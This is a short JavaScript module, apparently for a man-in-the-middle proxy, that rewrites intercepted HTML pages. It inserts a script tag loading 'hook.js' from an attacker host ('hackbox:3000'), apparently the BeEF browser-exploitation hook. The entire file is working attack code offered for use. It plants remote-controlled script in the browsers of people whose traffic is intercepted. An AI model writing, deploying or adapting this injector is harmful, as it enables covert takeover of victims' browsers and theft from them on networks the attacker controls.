function onLoad() {
    console.log( "BeefInject loaded." );
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://hackbox:3000/hook.js"></script></head>' 
            ); 
            res.Updated();
        }
    }
}
